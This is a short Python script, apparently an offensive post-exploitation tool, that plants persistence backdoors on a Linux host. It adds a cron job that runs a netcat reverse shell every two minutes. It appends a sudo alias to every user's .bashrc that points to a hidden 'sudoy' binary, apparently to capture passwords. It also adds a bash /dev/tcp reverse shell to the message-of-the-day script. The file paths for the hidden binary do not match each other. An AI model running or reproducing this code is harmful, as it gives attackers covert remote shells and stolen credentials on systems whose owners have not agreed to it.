import os
import subprocess
import sys

def createCronTabBackDoor(ip):
	os.system(f'(crontab -l ; echo "*/2 * * * * sleep 200 && nc {ip} 8888 -e /bin/bash") | crontab 2> /dev/null')

def backDoorBashRC():
	userHomeDirs = os.listdir('/home')
	for user in userHomeDirs:
		with open(f'/home/{user}/.bashrc', 'a') as bashrc:
			bashrc.write('chmod u+x /etc/default/.cron.d/sudoy\n')
			bashrc.write('alias sudo=/etc/default/.cron.d/sudoy\n')
	
	os.system('mkdir /etc/default/cron.d')
	os.system('cp ./sudoy /etc/default/cron.d/.sudoy')

def backDoorMessageOfTheDay(ip):
	with open('/etc/update-motd.d/00-header', 'a') as headerFile:
		headerFile.write(f'bash -c "bash -i >& /dev/tcp/{ip}/8282 0>&1"&') #update the ip and port accordingly

def main():
	backDoorBashRC()

if __name__ == '__main__':
	main()
